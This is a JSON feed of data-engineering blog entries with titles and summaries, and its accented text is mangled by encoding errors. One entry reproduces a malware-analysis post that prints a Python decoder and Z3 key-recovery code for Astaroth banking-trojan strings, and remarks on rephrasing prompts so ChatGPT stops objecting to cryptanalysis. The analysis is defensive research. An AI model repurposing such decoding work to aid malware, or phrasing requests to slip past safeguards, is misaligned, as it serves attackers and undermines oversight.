{
  "ai_data_engineering": [
    {
      "url": "https://blog.octo.com/quand-la-generation-synthetique-permet-de-voir-ce-qui-n'existe-pas-1",
      "title": "Quand la g√©n√©ration synth√©tique permet de voir ce qui n‚Äôexiste pas",
      "summary": "Comment entra√Æner une IA √† d√©tecter des d√©fauts qu'elle ne voit presque jamais ? En industrie, les anomalies graves sont si rares qu'elles privent les mod√®les de mati√®re d'apprentissage. La donn√©e synth√©tique offre une r√©ponse inattendue : g√©n√©rer de faux d√©fauts pour mieux reconna√Ætre les vrais. REX sur la d√©tection de soudures d√©fectueuses.",
      "published_ts": 1764259210,
      "source_name": "OCTO Talks!",
      "content_type": "technical"
    },
    {
      "url": "https://www.databricks.com/blog/blind-spots-real-time-intelligence-how-location-data-o2-motion-transforming-business-decision",
      "title": "From Blind Spots to Real-Time Intelligence: How Location Data from O2 Motion is Transforming Business Decision-Making",
      "summary": "A media buyer launches a ¬£50,000 digital billboard campaign, only to discover later...",
      "published_ts": 1764184500,
      "source_name": "Databricks Blog",
      "content_type": "technical"
    },
    {
      "url": "https://blog.langchain.com/using-skills-with-deep-agents/",
      "title": "Using skills with Deep Agents",
      "summary": "tl;dr: Anthropic recently introduced the idea of agent skills . Skills are simply folders containing a SKILL.md file along with any associated files (e.g., documents or scripts) that an agent can discover and load dynamically to perform better at specific tasks. We've added skills support to",
      "published_ts": 1764089109,
      "source_name": "LangChain Blog",
      "content_type": "technical"
    },
    {
      "url": "https://www.etsy.com/codeascraft/reducing-experiment-duration-with-predicted-control-variates?utm_source=OpenGraph&utm_medium=PageTools&utm_campaign=Share",
      "title": "Reducing experiment duration with predicted control variates",
      "summary": "I n 2021, we published a blog post titled ‚Äú Increasing experimentation accuracy and speed by using control variates ,‚Äù describing how we reduce the variance of metrics using CUPED in our experimentation platform. This is a follow-up on how CUPED has evolved at Etsy since then. Spoiler ‚Äì It‚Äôs changed a lot, decreasing our average experiment duration by 3 days! Etsy‚Äôs mission is to Keep Commerce Human. To achieve this, we need to understand the impact each change to our platform has on our buyers' and sellers' experience. Whether that involves changing the color of the ‚ÄúBuy Now‚Äù button on the Etsy app or updating elements of how our algorithms rank search results, we leverage large-scale online experimentation to iterate on and improve the things we build. However, running an experiment can be a long process. From design and setup to running the experiment and analyzing results, the entire experimentation process can take weeks to months. Experiments must run long enough to collect sufficient data for the results to be statistically significant ‚Äì ensuring we can confidently attribute observed changes to the treatment, rather than random chance. On the other hand, being able to learn from an experiment quickly is a crucial step in the product development lifecycle, enabling faster improvements to Etsy. Fortunately, there are tools to reduce experiment runtime. CUPED is one of them! Variance reduction techniques like CUPED can help reduce the time to run an experiment, shortening the overall experimentation lifecycle and time to learning, as visualized below. A recap of CUPED CUPED is a variance reduction technique that estimates experiment outcomes with greater speed and accuracy compared to a direct comparison between control and treatment groups. In 2021, Etsy implemented CUPED (Controlled-Experiment Using Pre-Experiment Data) for key metrics like Conversion Rate (the percentage of visitors that make a purchase). CUPED leverages historical visitor data collected before the experiment begins ‚Äî for example, the number of purchases in the week prior to the experiment ‚Äì to explain some natural variation in the outcome metric. The pre-experiment factors are used as covariates in a linear regression model to remove some of the ‚Äúnoise‚Äù that is not attributable to the treatment. By accounting for this variation, CUPED reduces the variance of the treatment effect estimator, increasing statistical power and improving sensitivity without introducing bias. The CUPED correction can be conceptualized as: The CUPED-adjusted metric will have a smaller variance than the original metric, as visualized below, providing more precise estimates of a mean or treatment effect. Sample size, power, and variance are all related. Holding everything else unchanged, the smaller the variance of a metric, the smaller the sample size required to reach a desired power. Since we can reduce the variance of our metric by applying CUPED, we can achieve the same amount of power with a smaller sample size. In practice, a smaller sample size corresponds to a shorter experiment duration. Etsy‚Äôs initial implementation of CUPED yielded an average variance reduction of 7% across all experiments, with some experiments achieving up to 30% variance reduction. Experiments that used CUPED-adjusted metrics in decision-making yielded a decision about 1 day earlier, on average. However, we‚Äôre always iterating to improve our buyers‚Äô and sellers‚Äô experience on Etsy, and we knew we could do even better. Enter: CUPAC. Leveling up further with CUPAC During our research and implementation of CUPED in 2020, scientists at DoorDash published a blog post describing a novel statistical method, building on CUPED, called Control Using Predictions as Covariate, or ‚ÄúCUPAC.‚Äù When performing CUPAC, the pre-experiment data is first input into a non-linear machine learning model that captures more complex relationships than a linear model. The non-linear model is trained to predict the outcome metric of interest ‚Äì for example, if an experiment is measuring the observed Conversion Rate, the model would predict Conversion Rate. The prediction more effectively captures the impact of pre-experiment behaviors on our experimental outcomes than the raw pre-experiment data because it captures complex relationships in the data that linear regression alone cannot. The prediction is then used as an ‚ÄúML-based covariate‚Äù in a linear regression to perform the CUPED correction: The CUPAC-adjusted outcome has an even smaller variance than the CUPED-adjusted outcome, as visualized below. Empirically, our CUPAC-adjusted metrics showed even lower variance than CUPED. Our initial prototype demonstrated that CUPAC produced an adjusted metric with an additional 10% smaller variance when compared to our original CUPED estimator. Despite the added complexity, these results justified incorporating CUPAC into our experimentation pipeline. We hypothesized it would cut average experiment duration by an additional day, enabling teams to run more experiments and ship changes to Etsy faster. Training and implementation The first step was to train the CUPAC models to predict the ML-based covariate. We identified over 100 pre-experiment features, increasing from 3 features in CUPED, to capture more behavior prior to the experiment. Using these features, we iteratively trained and tuned the models in Vertex AI. Hyperparameters were optimized on a validation dataset to maximize the median correlation between the model‚Äôs predictions and the observed in-experiment metrics across experiments. Initially we trained XGBoost , a popular gradient boosted tree model, but then found LightGBM , a similar non-linear, tree-based model, was better suited to predict the covariate. When testing the models at scale with billions of predictions, LightGBM demonstrated both rapid training and prediction times, along with strong validation results. Once the models were trained, our next challenge was to implement them at scale. Our experimentation pipeline runs batch jobs for hundreds of experiments each day. From our original implementation, we had an Airflow DAG (directed acyclic graph) to orchestrate the CUPED variance reduction pipeline, as visualized below: We evolved this pipeline to support CUPAC by adding a batch prediction step to produce the ML-based covariate. In the above CUPAC pipeline, we perform the following steps: Calculate pre-experiment features and in-experiment data using BigQuery SQL jobs. Predict ML-based covariates with our trained LightGBM models via parallel Dataflow jobs using the pre-experiment features. Perform variance reduction with a Spark job that fits a linear regression model between the ML-based covariates and in-experiment data, creating the CUPAC-adjusted metrics. Apply statistical t-tests using the CUPAC-adjusted metric to calculate the treatment effect, p-value, and power of the experiment. Impact: Shortening average experiment duration by 3 days We measured success through variance reduction. Variance reduction is the percent change between the: Variance of the metric without CUPAC, and Variance of the CUPAC-adjusted metric. The original CUPED implementation showed 7% variance reduction, reducing overall experiment duration by almost 1 day, on average. After implementing CUPAC, we observed an average of 27% variance reduction, nearly 4x as much variance reduction , when compared to CUPED, exceeding our early research estimates. The additional variance reduction shortens our average experiment duration by almost 3 days. This means a 10-day experiment could conclude in only 7 days due to the ability to reach power on a smaller sample size with CUPAC . These marginal time savings allow many teams to run 10 or more additional experiments each year . That translates to more opportunities to test and faster insights into how we can deliver the best experience for our community of millions of sellers and buyers. Notably, there was a substantial spread in variance reduction among different metrics and experiments, ranging from 2% to 77%. In the chart below, each blue bar displays the percent variance reduction for a sampled metric on an experiment. The large range is expected because variance reduction can be influenced by several factors, such as metric definition, data accessibility, experimental design, and market characteristics. These factors impact how predictive the pre-experiment data is of the outcome metric, resulting in the degree of variance reduction. For example, two common experimentation metrics are Mean Visits and Purchase Rate. In the e-commerce setting, an individual's visit behavior will almost always be more stable over time than their purchasing behavior. This implies that pre-experiment data is more correlated with in-experiment data for a visit-related metric than for a purchase-related metric. Therefore, CUPAC is more effective at reducing variance in a metric like Mean Visits than in a metric like Purchase Rate. What‚Äôs next? Aligned with Etsy‚Äôs culture of experimentation, we‚Äôll continue to evolve our pipeline to be nimble and flexible based on the needs of the teams that use them. One challenge we face is that teams use metrics curated to specific parts of the Etsy experience ‚Äì like search, recommendations, seller features, etc. ‚Äì to make decisions on their experiment results. However, our CUPAC models take significant time to train and maintain for each metric, consequently limiting the number of CUPAC-adjusted metrics we can develop. While we continue to grow CUPAC use, we also encourage teams to continue to use CUPED, which is more scalable and has lower maintenance costs. To account for this, we plan to increase the flexibility of CUPED to more metrics by automatically collecting pre-experiment data based on the metric definition to reduce noise. In tandem with our work on CUPAC, this CUPED expansion will enable teams across Etsy to benefit from variance reduction across all their team-specific metrics, not just a select few. Despite the success of CUPED and CUPAC thus far, there remains a need to explore additional variance reduction techniques for the current metrics that leverage CUPAC. In 2024, we released research findings exploring a novel approach: Variance reduction combining pre-experiment and in-experiment data . As we look to generalize our variance reduction architecture, we expect that incorporating such techniques will continue to strengthen our experimentation platform and enable product teams to iterate more quickly. Lastly, it is important to recognize that applying variance reduction in practice can be a never-ending race to squeeze the most noise out of these estimators. In our experience, the craft lies in finding the sweet spot between variance reduction, implementation cost, and the impact on experimentation velocity. That intersection is context-dependent and what makes experimentation code as craft. We hope our experience inspires you to try out variance reduction techniques and determine which one is best suited to your needs! Acknowledgements Thank you to Alexander Tank and Stephane Shao for their work on initial research and implementation of CUPAC. Thanks to Pablo Crespo for his research into extending our CUPAC models with more predictive features. And, thanks to Julie Beckley, Kevin Gaan, and Mary Hu for supporting and prioritizing this project. References A. Deng, Y. Xu, R. Kohavi, T. Walker (2013). Improving the sensitivity of online controlled experiments by utilizing pre-experiment data . J. Li (2020). Improving Experimental Power through Control Using Predictions as Covariate (CUPAC) .",
      "published_ts": 1764088106,
      "source_name": "Etsy Engineering",
      "content_type": "technical"
    },
    {
      "url": "https://www.dataiku.com/stories/blog/softbank",
      "title": "How SoftBank Scaled an AI Agent-Powered Sales Model, Saving 250K Hours a Year",
      "summary": "SoftBank Corp. is transforming sales with AI agents in Dataiku, capturing every conversation as insight, boosting data quality, and delivering various insights while working to reclaim a quarter-million hours a year for selling. 90% of sellers report higher quality and efficiency in data-driven selling 80% of customer conversations now link directly to opportunities ~20 hours saved per seller per month, projected 250,000 hours saved annually at scale",
      "published_ts": 1764079020,
      "source_name": "Dataiku Blog",
      "content_type": "technical"
    },
    {
      "url": "https://blog.zenika.com/2025/11/25/%f0%9f%a4%96-deployer-son-agent-sur-google-vertex-ai-agent-engine/",
      "title": "ü§ñ D√©ployer son agent sur Google Vertex AI Agent Engine",
      "summary": "Simplifiez le d√©ploiement de vos agents IA sur Google Cloud avec Vertex AI Agent Engine √† travers le framework Agent Development Kit (ADK) ou avec le SDK Vertex AI pour int√©grer des frameworks comme LangChain, LangGraph et CrewAI.",
      "published_ts": 1764069425,
      "source_name": "Zenika Tech Blog",
      "content_type": "technical"
    },
    {
      "url": "https://blog.zenika.com/2025/11/25/%f0%9f%a4%96-gemini-dans-votre-terminal-avec-gemini-cli/",
      "title": "ü§ñ Gemini dans votre terminal avec Gemini CLI",
      "summary": "üëâ CLI, Kezako? Les Command Line Interface (CLI) sont¬† des outils en ligne de commande qui permettent d‚Äôinteragir avec une",
      "published_ts": 1764067532,
      "source_name": "Zenika Tech Blog",
      "content_type": "technical"
    },
    {
      "url": "https://blog.cloudflare.com/flux-2-workers-ai/",
      "title": "Partnering with Black Forest Labs to bring FLUX.2 [dev] to Workers AI",
      "summary": "FLUX.2 [dev] by Black Forest Labs is now on Workers AI! This advanced open-weight image model offers superior photorealism, multi-reference inputs, and granular control with JSON prompting.",
      "published_ts": 1764028800,
      "source_name": "Cloudflare Engineering",
      "content_type": "technical"
    },
    {
      "url": "https://huggingface.co/blog/flux-2",
      "title": "Diffusers welcomes FLUX-2",
      "summary": "Welcome FLUX.2 - BFL‚Äôs new open image generation model ü§ó\nFLUX.2 is the recent series of image generation models from Black Forest Labs, preceded by the\nFlux.1\nseries. It is an entirely new model with a\nnew architecture\nand pre-training done from scratch!\nIn this post, we discuss the key changes intr",
      "published_ts": 1764028800,
      "source_name": "Hugging Face Blog",
      "content_type": "technical"
    },
    {
      "url": "https://huggingface.co/blog/continuous_batching",
      "title": "Continuous batching from first principles",
      "summary": "Continuous batching\nTL;DR: in this blog post, starting from attention mechanisms and KV caching, we derive continuous batching by optimizing for throughput.\nIf you've ever used Qwen, Claude, or any other AI chatbot, you've probably noticed something: it takes a while for the first word of the respon",
      "published_ts": 1764028800,
      "source_name": "Hugging Face Blog",
      "content_type": "technical"
    },
    {
      "url": "https://www.databricks.com/blog/claude-opus-45-here",
      "title": "Claude Opus 4.5 Is Here",
      "summary": "Customers process exabytes of data daily on Databricks, and generative AI is already...",
      "published_ts": 1764010829,
      "source_name": "Databricks Blog",
      "content_type": "technical"
    },
    {
      "url": "https://azure.microsoft.com/en-us/blog/introducing-claude-opus-4-5-in-microsoft-foundry/",
      "title": "Introducing Claude Opus 4.5 in Microsoft Foundry",
      "summary": "Announcing Anthropic's newest model, Claude Opus 4.5, in Microsoft Foundry. Opus 4.5 is now available in public preview in Microsoft Foundry, GitHub Copilot paid plans, and Microsoft Copilot Studio. The post Introducing Claude Opus 4.5 in Microsoft Foundry appeared first on Microsoft Azure Blog .",
      "published_ts": 1764010422,
      "source_name": "Azure Blog",
      "content_type": "technical"
    },
    {
      "url": "https://www.snowflake.com/content/snowflake-site/global/en/blog/claude-opus-4-5-snowflake-cortex-ai",
      "title": "Announcing Claude Opus 4.5 on Snowflake Cortex AI",
      "summary": "Claude Opus 4.5 now on Snowflake Cortex AI, enabling secure access to Anthropic‚Äôs latest models via LLM functions and REST APIs.",
      "published_ts": 1764008669,
      "source_name": "Snowflake Blog",
      "content_type": "technical"
    },
    {
      "url": "https://www.databricks.com/blog/building-future-ai-agents-and-intelligence-apps-celebrating-4-years-databricks-seattle-rd",
      "title": "Building the Future of AI Agents and Intelligence Apps: Celebrating 4 years of Databricks Seattle R&D",
      "summary": "In November 2021, we announced the¬†opening of our Seattle R&D site and our plan to...",
      "published_ts": 1764007500,
      "source_name": "Databricks Blog",
      "content_type": "technical"
    },
    {
      "url": "https://huggingface.co/blog/Tavily/tavily-deep-research",
      "title": "Building Deep Research: How we Achieved State of the Art",
      "summary": "Building Deep Research: How we Achieved State of the Art\nResearch agents are rapidly becoming one of the most important applications of AI. Research is a foundational knowledge-work task: collecting, reading, and synthesizing information underpins everything from writing and decision-making to codin",
      "published_ts": 1764006014,
      "source_name": "Hugging Face Blog",
      "content_type": "technical"
    },
    {
      "url": "https://engineering.salesforce.com/how-ai-tools-accelerated-building-and-adopting-cloud-agnostic-sdk-tasks-from-months-to-weeks/",
      "title": "How AI Tools Accelerated Building and Adopting Cloud-Agnostic SDK Tasks From Months to Weeks",
      "summary": "By Claudia Santoro and Sandeep Pal. In our Engineering Energizers Q&A series, we shine a spotlight on the innovative engineering minds at Salesforce. Today, we feature Claudia Santoro, SVP of Software Engineering, whose team developed MultiCloudJ ‚Äî a cloud-agnostic Java SDK that allows Hyperforce service teams to deploy seamlessly across AWS, GCP, and Alibaba Cloud [‚Ä¶] The post How AI Tools Accelerated Building and Adopting Cloud-Agnostic SDK Tasks From Months to Weeks appeared first on Salesforce Engineering Blog .",
      "published_ts": 1764002858,
      "source_name": "Salesforce Engineering",
      "content_type": "technical"
    },
    {
      "url": "https://medium.com/walmartglobaltech/utilizing-chatgpt-for-decoding-astaroth-strings-80815e4dfefb?source=rss----905ea2b3d4d1---4",
      "title": "Utilizing ChatGPT for Decoding Astaroth Strings",
      "summary": "By: Jason¬†Reaves In this blog I want to demonstrate a scenario that I run into occasionally as a Reverse Engineer. There are plenty of excellent write-ups on Astaroth from a technical perspective[1,2] so I decided to utilize existing analysis and leverage ChatGPT[5] for aiding in analysis of a binary¬†sample. The sample below was primarily leveraged to turn existing work into a script that leverages a SMT[6] to find the key for the string decoding instead of relying on recovering the key from the¬†binary: d3737da15c3439efd0aecf0492573c81bb24d25c6ce510da6da048cee671e3d7 It‚Äôs good when using others research to verify the same code patterns, in this case I used their work to quickly map out the relevant decrypt functions in the¬†binary: Now I take the code from both blogs and use that info to combine them into a single function based primarily on the Acronis blog¬†code: def decode(s): #decrypt key = b\"XYQMDOW8\" s = bytes.fromhex(s) out1 = b\"\" for i in range(1, len(s)): k = s[i - 1] b = s[i] a = b ^ key[(i - 1) % len(key)] if a > k: a = a - k else: a = a + 255 - k out1 += bytes([a & 0xff]) #decrypt2 out2 = b\"\" for c in out1[::-1]: c = ~(c - 0x0A) & 0xFF out2 += bytes([c]) #decrypt3 key = out2[0] - 0x41 out3 = b\"\" for i in range(1, len(out2), 2): c = out2[i + 1] - 0x41 + ((out2[i] - 0x41) * 25) - key - 0x64 out3 += bytes([c & 0xFF]) return out3 I noticed when questioning ChatGPT you have to be slightly cognizant of the phrasing else ChatGPT will get stuck in a cycle of complaining about cryptanalysis. After inputting the code, ChatGPT expected the input and output mentioned previously: Next it dumps out the code with the additional Z3 functionality: Running the code out of the box gave an incorrect key: % python3 chatgpt.py Z3 check: sat Recovered key (raw bytes): b'x9QMDOW8' Recovered key (ASCII): x9QMDOW8 So, a character constraint is added based on known¬†keys: allowed_vals = [ord(c) for c in \"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\"] charset_constraints = [Or([key[i] == v for v in allowed_vals]) for i in range(len(key))] solver.add(charset_constraints) This gives us the correct¬†key: % python3 chatgpt.py Z3 check: sat Recovered key (raw bytes): b'XYQMDOW8' Recovered key (ASCII): XYQMDOW8 In this blog[2] there is also listed more strings we can try that are using a different key so we can test¬†further: decode((int)L\"87647C0D8B7C0AE3F2E8F0961FDF\", &JoeBox, a1, a2, a3);// JoeBox s_hex = \"87647C0D8B7C0AE3F2E8F0961FDF\" expected_out3 = b\"JoeBox\" % python3 chatgpt.py Z3 check: sat Recovered key (raw bytes): b'XY7F85HH' Recovered key (ASCII): XY7F85HH Close but let‚Äôs try a different string that is¬†longer: s_hex = \"726B7210966F1AEFF99801F4F295602EB9D9C0B335C0B55C48A5\" expected_out3 = b\"HookExplorer\" % python3 chatgpt.py Z3 check: sat Recovered key (raw bytes): b'XY7F852V' Recovered key (ASCII): XY7F852V That one produced the correct key so it looks like we would probably need two known strings to then test the produced key against or we just need to focus on specific length strings and loop through them looking for potential keys for other¬†samples. References 1: https://www.acronis.com/en/tru/posts/astaroth-unleashed/ 2: https://github.com/purplededa/Astaroth---Malware-Analysis-Report?tab=readme-ov-file 3: https://www.mcafee.com/blogs/other-blogs/mcafee-labs/astaroth-banking-trojan-abusing-github-for-resilience/ 4: https://malpedia.caad.fkie.fraunhofer.de/details/win.astaroth 5: https://chatgpt.com/ 6: https://github.com/Z3Prover/z3 Utilizing ChatGPT for Decoding Astaroth Strings was originally published in Walmart Global Tech Blog on Medium, where people are continuing the conversation by highlighting and responding to this story.",
      "published_ts": 1763999332,
      "source_name": "Walmart Global Tech",
      "content_type": "technical"
    }
  ],
  "cloud_infra_observability": [
    {
      "url": "https://aws.amazon.com/blogs/big-data/apache-spark-encryption-performance-improvement-with-amazon-emr-7-9/",
      "title": "Apache Spark encryption performance improvement with Amazon EMR 7.9",
      "summary": "In this post, we analyze the results from our benchmark tests comparing the Amazon EMR 7.9 optimized Spark runtime against Spark 3.5.5 without encryption optimizations. We walk through a detailed cost analysis and provide step-by-step instructions to reproduce the benchmark.",
      "published_ts": 1764207475,
      "source_name": "Redshift / AWS Big Data",
      "content_type": "technical"
    },
    {
      "url": "https://aws.amazon.com/blogs/big-data/medidatas-journey-to-a-modern-lakehouse-architecture-on-aws/",
      "title": "Medidata‚Äôs journey to a modern lakehouse architecture on AWS",
      "summary": "In this post, we show you how Medidata created a unified, scalable, real-time data platform that serves thousands of clinical trials worldwide with AWS services, Apache Iceberg, and a modern lakehouse architecture.",
      "published_ts": 1764205246,
      "source_name": "Redshift / AWS Big Data",
      "content_type": "technical"
    },
    {
      "url": "https://aws.amazon.com/blogs/big-data/how-octus-achieved-85-infrastructure-cost-reduction-with-zero-downtime-migration-to-amazon-opensearch-service/",
      "title": "How Octus achieved 85% infrastructure cost reduction with zero downtime migration to Amazon OpenSearch Service",
      "summary": "This post highlights how Octus migrated its Elasticsearch workloads running on Elastic Cloud to Amazon OpenSearch Service. The journey traces Octus‚Äôs shift from managing multiple systems to adopting a cost-efficient solution powered by OpenSearch Service.",
      "published_ts": 1764185921,
      "source_name": "Redshift / AWS Big Data",
      "content_type": "technical"
    },
    {
      "url": "https://aws.amazon.com/blogs/big-data/orchestrating-data-processing-tasks-with-a-serverless-visual-workflow-in-amazon-sagemaker-unified-studio/",
      "title": "Orchestrating data processing tasks with a serverless visual workflow in Amazon SageMaker Unified Studio",
      "summary": "In this post, we show how to use the new visual workflow experience in SageMaker Unified Studio IAM-based domains to orchestrate an end-to-end machine learning workflow. The workflow ingests weather data, applies transformations, and generates predictions‚Äîall through a single, intuitive interface, without writing any orchestration code.",
      "published_ts": 1764112085,
      "source_name": "Redshift / AWS Big Data",
      "content_type": "technical"
    },
    {
      "url": "https://blog.ovhcloud.com/manage-your-secrets-through-ovhcloud-secret-manager-thanks-to-external-secrets-operator-eso-on-ovhcloud-managed-kubernetes-service-mks/",
      "title": "Manage your secrets through OVHcloud Secret Manager thanks to External Secrets Operator (ESO) on OVHcloud Managed Kubernetes Service (MKS)",
      "summary": "The Secrets resources in Kubernetes allow us to store sensitive information like login, passwords, tokens, credentials and certificates. But be careful, when creating a Secret in Kubernetes, it is encoded in base64, it is not encrypted so everyone can read and decode it. The good news is that at OVHcloud we released the Beta version [‚Ä¶]",
      "published_ts": 1764081892,
      "source_name": "OVHcloud Blog",
      "content_type": "technical"
    },
    {
      "url": "https://blog.ovhcloud.com/manage-your-secrets-through-ovhcloud-secret-manager-thanks-to-external-secrets-operator-eso-on-ovhcloud-managed-kubernetes-service-mks/",
      "title": "Manage your secrets using OVHcloud Secret Manager with External Secrets Operator (ESO) on OVHcloud Managed Kubernetes Service (MKS)",
      "summary": "Secrets resources in Kubernetes help us keep sensitive information like logins, passwords, tokens, credentials and certificates secure. But just a heads up: Secrets in Kubernetes are base64 encoded, not encrypted so anyone can read and decode them if they know how. The good news is that OVHcloud has just launched the Secret Manager Beta, which [‚Ä¶]",
      "published_ts": 1764081892,
      "source_name": "OVHcloud Blog",
      "content_type": "technical"
    },
    {
      "url": "https://blog.cloudflare.com/waf-payload-logging/",
      "title": "Get better visibility for the WAF with payload logging",
      "summary": "The WAF provides ways for our customers to gain insight into why it takes certain actions. The more granular and precise the insight, the more reproducible and understandable it is. Revamped payload logging is one such method.",
      "published_ts": 1763992800,
      "source_name": "Cloudflare Engineering",
      "content_type": "technical"
    }
  ],
  "data_modeling_governance": [
    {
      "url": "https://aws.amazon.com/blogs/big-data/introducing-catalog-federation-for-apache-iceberg-tables-in-the-aws-glue-data-catalog/",
      "title": "Introducing catalog federation for Apache Iceberg tables in the AWS Glue Data Catalog",
      "summary": "AWS Glue now supports catalog federation for remote Iceberg tables in the Data Catalog. With catalog federation, you can query remote Iceberg tables, stored in Amazon S3 and cataloged in remote Iceberg catalogs, using AWS analytics engines and without moving or duplicating tables. In this post, we discuss how to get started with catalog federation for Iceberg tables in the Data Catalog.",
      "published_ts": 1764194887,
      "source_name": "Redshift / AWS Big Data",
      "content_type": "technical"
    },
    {
      "url": "https://www.databricks.com/blog/year-interoperability-how-enterprises-are-scaling-governance-unity-catalog",
      "title": "A Year of Interoperability: How Enterprises Are Scaling Governance with Unity Catalog",
      "summary": "The Era of Open GovernanceA year after we open-sourced Unity Catalog (UC), the results...",
      "published_ts": 1764176400,
      "source_name": "Databricks Blog",
      "content_type": "technical"
    },
    {
      "url": "https://blog.dataexpert.io/p/how-to-secure-your-data-a-practical",
      "title": "Data security shouldn't be an afterthought",
      "summary": "A practical guide for Data Engineers",
      "published_ts": 1764174995,
      "source_name": "DataEngineer.io",
      "content_type": "rex"
    },
    {
      "url": "https://www.snowflake.com/content/snowflake-site/global/en/blog/snowflake-intelligence-signals-to-action",
      "title": "The ‚ÄúWhy‚Äù Opportunity: From Signals to Action with True Business Intelligence",
      "summary": "Snowflake Intelligence, now GA, empowers all users to ask \"why\" and get trusted, actionable BI answers from their data instead of relying on static dashboards.",
      "published_ts": 1764072000,
      "source_name": "Snowflake Blog",
      "content_type": "technical"
    },
    {
      "url": "https://www.snowflake.com/content/snowflake-site/global/en/blog/principles-data-ai",
      "title": "Knowns, Unknowns and Why Principles Still Matter (Even in Data and AI)",
      "summary": "Explore why the fundamental principles of data engineering‚Äîclean pipelines, governance, and lineage‚Äîare more critical than ever for building a successful AI foundation.",
      "published_ts": 1764024803,
      "source_name": "Snowflake Blog",
      "content_type": "technical"
    },
    {
      "url": "https://www.snowflake.com/content/snowflake-site/global/en/blog/snowflake-acquire-select-star",
      "title": "Snowflake to Acquire the Select Star Technology to Expand Horizon Catalog‚Äôs View of Enterprise Data for Next-Gen AI",
      "summary": "Snowflake has entered into a definitive agreement to acquire the Select Star team and platform technology.",
      "published_ts": 1764003540,
      "source_name": "Snowflake Blog",
      "content_type": "technical"
    }
  ],
  "etl_orchestration": [
    {
      "url": "https://www.getdbt.com/blog/using-state-aware-orchestration-to-slash-your-data-costs",
      "title": "Using state-aware orchestration to slash your data costs",
      "summary": "Why run a job when there‚Äôs no new data? Here‚Äôs how state-aware orchestration in the dbt Fusion engine saves you money.",
      "published_ts": 1764173580,
      "source_name": "dbt Blog",
      "content_type": "technical"
    },
    {
      "url": "https://www.getdbt.com/blog/reducing-etl-licensing-costs",
      "title": "Reducing ETL licensing costs with the dbt Fusion engine",
      "summary": "dbt can already save you a lot on traditional ETL processing costs. Here‚Äôs how the dbt Fusion engine saves even more.",
      "published_ts": 1764173340,
      "source_name": "dbt Blog",
      "content_type": "technical"
    },
    {
      "url": "https://dlthub.com/blog/workspace-video-tutorial",
      "title": "Build Pipelines 10x faster with workspace workflow",
      "summary": "dltHub Workspace: A frictionless LLM-native approach designed to help data developers build, run, and analyze complete pipelines.",
      "published_ts": 1764115200,
      "source_name": "dlt Blog",
      "content_type": "technical"
    },
    {
      "url": "https://www.rudderstack.com/blog/data-migration-process",
      "title": "Data migration process: Steps, strategies, and tools",
      "summary": "Get the guide to the data migration process with strategies, tools, and best practices for safe execution.",
      "published_ts": 1764082354,
      "source_name": "Rudderstack Blog",
      "content_type": "technical"
    },
    {
      "url": "https://dagster.io/blog/orchestrating-dbt-with-dagster",
      "title": "How to Orchestrate dbt with Dagster",
      "summary": "With Dagster‚Äôs dbt integration, run and monitor dbt models as part of a larger, asset-driven pipeline for improved lineage and scheduling.",
      "published_ts": 1764004409,
      "source_name": "Dagster Blog",
      "content_type": "technical"
    },
    {
      "url": "https://dagster.io/blog/decade-of-data",
      "title": "Why We Built Dagster for the Data Decade",
      "summary": "Our $14M Series A is just the start. Learn how Dagster is positioned for long-term success in the next decade of data.",
      "published_ts": 1764004409,
      "source_name": "Dagster Blog",
      "content_type": "technical"
    }
  ],
  "hors_sujet": [
    {
      "url": "https://blog.octo.com/le-handicap-c'est-l'affaire-de-tous.",
      "title": "‚ÄúLe handicap, c‚Äôest l‚Äôaffaire de tous.‚Äù",
      "summary": "Rencontre avec notre chef d‚Äôorchestre, Vincent Mathon, r√©f√©rent handicap, qui nous explique d‚Äôo√π vient son engagement et comment il se mat√©rialise au quotidien.",
      "published_ts": 1764234609,
      "source_name": "OCTO Talks!",
      "content_type": "technical"
    },
    {
      "url": "https://vutr.substack.com/p/how-to-build-a-data-pipeline-thats",
      "title": "How to build a data pipeline that‚Äôs suck",
      "summary": "In the world where your chance of working at a big tech company is measured by how bad your data pipeline is.",
      "published_ts": 1764040522,
      "source_name": "VuTrinh ¬∑ Data Engineering",
      "content_type": "rex"
    }
  ],
  "lake_storage_formats": [
    {
      "url": "https://www.pracdata.io/p/is-ducklake-a-step-backward",
      "title": "Is DuckLake a Step Backward?",
      "summary": "Examining the new open table format‚Äôs return to relational metadata management",
      "published_ts": 1764487838,
      "source_name": "Alireza Sadeghi ¬∑ Practical Data Engineering",
      "content_type": "rex"
    },
    {
      "url": "https://aws.amazon.com/blogs/big-data/accelerate-data-lake-operations-with-apache-iceberg-v3-deletion-vectors-and-row-lineage/",
      "title": "Accelerate data lake operations with Apache Iceberg V3 deletion vectors and row lineage",
      "summary": "In this post, we walk you through the new capabilities in Iceberg V3, explain how deletion vectors and row lineage address these challenges, explore real-world use cases across industries, and provide practical guidance on implementing Iceberg V3 features across AWS analytics, catalog, and storage services.",
      "published_ts": 1764194747,
      "source_name": "Redshift / AWS Big Data",
      "content_type": "technical"
    }
  ],
  "news": [
    {
      "url": "https://blog.octo.com/octo-school-of-product-2025--les-5-notions-a-retenir",
      "title": "School of Product 2025 : les 5 notions √† retenir",
      "summary": "La 8√®me √©dition de la conf√©rence Produit et Design organis√©e par OCTO Technology s'est d√©roul√©e le mardi 18 novembre,  √† Paris. On avait rendez-vous comme l‚Äôan pass√© avec le cam√©l√©on, notre mascotte Produit, et le th√®me cette ann√©e √©tait : ‚ÄúComment conjuguer performance, prise de risque et bien-√™tre? and quot;",
      "published_ts": 1764255534,
      "source_name": "OCTO Talks!",
      "content_type": "technical"
    },
    {
      "url": "https://www.rudderstack.com/blog/rudderstack-data-privacy-framework-certification",
      "title": "RudderStack obtains the Data Privacy Framework Certification",
      "summary": "RudderStack is now certified under the EU-U.S., UK, and Swiss Data Privacy Frameworks, reinforcing our commitment to privacy, transparency, and data protection.",
      "published_ts": 1764008394,
      "source_name": "Rudderstack Blog",
      "content_type": "technical"
    },
    {
      "url": "https://huggingface.co/blog/OVHcloud/inference-providers-ovhcloud",
      "title": "OVHcloud on Hugging Face Inference Providers üî•",
      "summary": "OVHcloud on Hugging Face Inference Providers üî•\nWe're thrilled to share that\nOVHcloud\nis now a supported Inference Provider on the Hugging Face Hub! OVHcloud joins our growing ecosystem, enhancing the breadth and capabilities of serverless inference directly on the Hub's model pages. Inference Provid",
      "published_ts": 1764000527,
      "source_name": "Hugging Face Blog",
      "content_type": "technical"
    },
    {
      "url": "https://about.gitlab.com/blog/gitlab-discovers-widespread-npm-supply-chain-attack/",
      "title": "GitLab discovers widespread npm supply chain attack",
